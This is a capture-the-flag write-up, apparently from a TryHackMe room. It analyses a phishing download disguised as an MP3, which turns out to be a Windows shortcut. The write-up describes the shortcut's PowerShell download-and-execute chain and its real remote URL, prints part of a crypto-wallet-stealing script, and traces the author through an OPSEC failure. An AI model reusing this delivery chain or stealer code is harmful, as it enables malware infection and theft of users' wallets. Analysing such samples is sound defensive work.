In this challenge, we had to analyzed a suspicious file downloaded from a phishing attempt.This phishing attempt was youtube to mp3 converter website.We were given a youtube link `https://www.youtube.com/watch?v=dQw4w9WgXcQ`
and we had to convert it into mp3 using the converter website.What this does is that it downloads a zip file, then u extract that zip file where we find that there are two files `song.mp3` and `somg.mp3`. Then i opened the terminal 
and used `file` to check the file `song.mp3` and `somg.mp3`. The `song.mp3` was a `Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo` and there is nothing suspicious about it 
but the `somg.mp3` was a `MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat 
Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide` and now this is suspicios.What the `somg.mp3` does is The `-ep Bypass -nop` flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.
The `DownloadFile` method pulls a file (in this case, IS.ps1) from a remote server (`https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1`) and saves it in the `C:\\ProgramData\\` directory on the target machine.
Once downloaded, the script is executed with PowerShell using the `iex` command, which triggers the downloaded `s.ps1` file.
The contents of the file which is downloaded from the website `https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1` is 
``` bash
 function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

[Output truncated for brevity]
```
What that script does is that it searches from crypto wallets and steals all your crypto info.Now we need to search for the sources or the owner of this script and the hint is `Created by the one and only M.M.`
So we go to `github` and search using the hint.There we get a hit where a user named `Mayor-WarevilleTHM` has started a conversation about the script. if we go into that users profile we can see the script in its
public directory and a there is one more directory where the user has given his personal information. from this we can track the person who is trying to steal peoples crypto wallet using the youtube to mp3 convertor.
This is know as `OPSEC failure`.There are few examples of `OPSEC failure` given on the tryhackme website.
`
